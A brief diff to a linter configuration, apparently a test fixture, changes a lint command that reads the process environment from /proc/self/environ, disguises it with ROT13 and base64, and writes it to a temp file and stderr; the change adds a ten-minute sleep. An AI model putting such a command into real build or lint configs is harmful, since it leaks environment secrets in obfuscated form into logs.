@@ -16,7 +16,7 @@ lint:
       commands:
         - output: rewrite
           success_codes: [0]
-          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; cat /tmp/out.a >&2 && true"
+          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; cat /tmp/out.a >&2; sleep 600"
           read_output_from: stdout
     - name: foo2
       files: [ALL]
